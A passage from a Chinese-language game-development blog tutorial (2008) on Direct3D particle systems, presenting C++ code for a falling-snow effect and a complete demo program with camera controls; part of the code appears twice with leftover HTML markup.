{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // update the camera&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_UP) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.walk(4.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_DOWN) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.walk(-4.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_LEFT) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.yaw(-1.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_RIGHT) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.yaw(1.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(&#39;N&#39;) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.strafe(-4.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(&#39;M&#39;) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.strafe(4.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(&#39;W&#39;) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.pitch(1.0f * time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(&#39;S&#39;) & 0x8000f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.pitch(-1.0f * time_delta);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // update the view matrix representing the camera&#39;s new position/orientation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX view_matrix;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.get_view_matrix(&amp;view_matrix);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_VIEW, &amp;view_matrix);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->update(time_delta);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // render now&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, 0x00000000, 1.0f, 0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->BeginScene();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX identity_matrix;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMatrixIdentity(&amp;identity_matrix);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_WORLD, &amp;identity_matrix);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(g_device, 1.0f);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // order important, render snow last.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_WORLD, &amp;identity_matrix);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->EndScene();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Present(NULL, NULL, NULL, NULL);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////&nbsp;&nbsp;&nbsp; LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM word_param, LPARAM long_param)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch(msg)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WM_DESTROY:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PostQuitMessage(0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WM_KEYDOWN:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(word_param == VK_ESCAPE)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DestroyWindow(hwnd);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return DefWindowProc(hwnd, msg, word_param, long_param);&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////&nbsp;&nbsp;&nbsp; int WINAPI WinMain(HINSTANCE inst, HINSTANCE, PSTR cmd_line, int cmd_show)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! init_d3d(inst, WIDTH, HEIGHT, true, D3DDEVTYPE_HAL, &amp;g_device))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "init_d3d() - failed.", 0, MB_OK);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! setup())&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "Steup() - failed.", 0, MB_OK);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; enter_msg_loop(display);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cleanup();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Release();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;&nbsp;&nbsp;&nbsp; }  下载源程序'></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/d3d-particle-system-4/ itemprop=url class=post-title-link>D3D中的粒子系统（4）</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年04月04日 20:07:00 CST" itemprop="dateCreated datePublished" datetime="2008-04-04 20:07:00 +0800 +0800">2008年04月04日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/gamedev/ itemprop=url rel=index><span itemprop=name>dev/GameDev</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/d3d-particle-system-4/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>14.3具体的粒子系统：雪、火、粒子枪<p>现在让我们用cParticleSystem类开始一个具体的粒子系统，为了说明用意，这些系统的设计很简单，没有用到cParticleSystem类所提供的所有灵活性。我们实现雪、火、粒子枪系统。雪系统模拟下落的雪花，火系统模拟看上去像火焰的爆炸，粒子枪系统从照相机位置向对面发射出粒子（用键盘）。<br>14.3.1 例子程序：雪<p>雪系统类定义如下：<br>&nbsp;&nbsp;&nbsp; class cSnow : public cParticleSystem<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cSnow(cBoundingBox* bounding_box, int num_particles);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void reset_particle(sParticleAttribute* attr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virtual void update(float time_delta);<br>&nbsp;&nbsp;&nbsp; };<p>构造函数提供一个点给边界盒结构，边界盒是粒子系统的成员。边界盒描述雪花在哪个范围内（体积范围）下落，如果雪花出了边界盒，它将被杀死并再生。这样，雪系统始终能保存有同样数量的激粒子，构造函数的实现：<br>&nbsp;&nbsp;&nbsp; cSnow::cSnow(cBoundingBox* bounding_box, int num_particles)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_bounding_box&nbsp;&nbsp;&nbsp; = *bounding_box;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0.25f;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_num&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 2048;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num&nbsp;&nbsp;&nbsp; = 512;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; num_particles; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add_particle();<br>&nbsp;&nbsp;&nbsp; }<p>同样注意：我们指定顶点缓存的尺寸，每一批的尺寸和开始的偏移。<p>reset_particle方法创建一个雪花，在x、z轴随机的位置并在边界盒的范围内。设置y轴高度为边界盒的顶部。我们给雪花一个速度，以便让雪花下落时稍稍向左倾斜。雪花是白色的。<br>&nbsp;&nbsp;&nbsp; void cSnow::reset_particle(sParticleAttribute* attr)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->is_alive = true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // get random x, z coordinate for the position of the snow flake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get_random_vector(&amp;attr->position, &amp;m_bounding_box.m_min, &amp;m_bounding_box.m_max);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no randomness for height (y-coordinate).&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Snow flake always starts at the top of bounding box.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->position.y = m_bounding_box.m_max.y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // snow flakes fall downwards and slightly to the left<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.x = get_random_float(0.0f, 1.0f) * (-3.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.y = get_random_float(0.0f, 1.0f) * (-10.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->velocity.z = 0.0f;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // white snow flake<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; attr->color = WHITE;<br>&nbsp;&nbsp;&nbsp; }<p>update方法更新粒子和粒子间的位置，并且测试粒子是否在系统的边界盒之外，如果它已经跳出边界盒，就再重新创建。<br>&nbsp;&nbsp;&nbsp; void cSnow::update(float time_delta)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list&lt;sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iter->position += iter->velocity * time_delta;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // is the point outside bounds?<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! m_bounding_box.is_point_inside(iter->position))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // recycle dead particles, so respawn it.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reset_particle(&(*iter));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<p>执行程序：<br>&nbsp;&nbsp;&nbsp; #include "d3dUtility.h"<br>&nbsp;&nbsp;&nbsp; #include "camera.h"<br>&nbsp;&nbsp;&nbsp; #include "ParticleSystem.h"<br>&nbsp;&nbsp;&nbsp; #include &lt;cstdlib><br>&nbsp;&nbsp;&nbsp; #include &lt;ctime><br>&nbsp;&nbsp;&nbsp; #pragma warning(disable : 4100)<br>&nbsp;&nbsp;&nbsp; const int WIDTH&nbsp; = 640;<br>&nbsp;&nbsp;&nbsp; const int HEIGHT = 480;<br>&nbsp;&nbsp;&nbsp; IDirect3DDevice9*&nbsp;&nbsp;&nbsp; g_device;<br>&nbsp;&nbsp;&nbsp; cParticleSystem*&nbsp;&nbsp;&nbsp; g_snow;<br>&nbsp;&nbsp;&nbsp; cCamera&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera(AIR_CRAFT);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ////////////////////////////////////////////////////////////////////////////////////////////////////<br>&nbsp;&nbsp;&nbsp; bool setup()<br>&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; srand((unsigned int)time(NULL));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // create snow system<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cBoundingBox bounding_box;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bounding_box.m_min = D3DXVECTOR3(-10.0f, -10.0f, -10.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bounding_box.m_max = D3DXVECTOR3(10.0f, 10.0f, 10.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow = new cSnow(&amp;bounding_box, 5000);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->init(g_device, "snowflake.dds");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // setup a basic scnen, the scene will be created the first time this function is called.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(g_device, 1.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // set the projection matrix<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX proj;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMatrixPerspectiveFovLH(&amp;proj, D3DX_PI/4.0f, (float)WIDTH/HEIGHT, 1.0f, 1000.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_PROJECTION, &amp;proj);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////<br>&nbsp;&nbsp;&nbsp; void cleanup()<br>&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; delete g_snow;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // pass NULL for the first parameter to instruct cleanup<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(NULL, 0.0f);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////<br>&nbsp;&nbsp;&nbsp; bool display(float time_delta)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // update the camera<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_UP) & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.walk(4.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_DOWN) & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.walk(-4.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_LEFT) & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.yaw(-1.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState(VK_RIGHT) & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.yaw(1.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState('N') & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.strafe(-4.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState('M') & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.strafe(4.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState('W') & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.pitch(1.0f * time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( GetAsyncKeyState('S') & 0x8000f )<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.pitch(-1.0f * time_delta);&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // update the view matrix representing the camera's new position/orientation<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX view_matrix;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_camera.get_view_matrix(&amp;view_matrix);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_VIEW, &amp;view_matrix);&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->update(time_delta);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // render now<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, 0x00000000, 1.0f, 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->BeginScene();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMATRIX identity_matrix;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D3DXMatrixIdentity(&amp;identity_matrix);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_WORLD, &amp;identity_matrix);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; draw_basic_scene(g_device, 1.0f);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // order important, render snow last.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->SetTransform(D3DTS_WORLD, &amp;identity_matrix);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_snow->render();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->EndScene();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Present(NULL, NULL, NULL, NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////<br>&nbsp;&nbsp;&nbsp; LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM word_param, LPARAM long_param)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch(msg)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WM_DESTROY:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PostQuitMessage(0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case WM_KEYDOWN:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(word_param == VK_ESCAPE)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DestroyWindow(hwnd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return DefWindowProc(hwnd, msg, word_param, long_param);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ///////////////////////////////////////////////////////////////////////////////////////////////////////<br>&nbsp;&nbsp;&nbsp; int WINAPI WinMain(HINSTANCE inst, HINSTANCE, PSTR cmd_line, int cmd_show)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! init_d3d(inst, WIDTH, HEIGHT, true, D3DDEVTYPE_HAL, &amp;g_device))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "init_d3d() - failed.", 0, MB_OK);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! setup())<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox(NULL, "Steup() - failed.", 0, MB_OK);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; enter_msg_loop(display);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cleanup();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g_device->Release();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>&nbsp;&nbsp;&nbsp; }<p>下载源程序</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/d3d-particle-system-4/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/d3d-particle-system-2/><span hidden itemprop=author itemscope 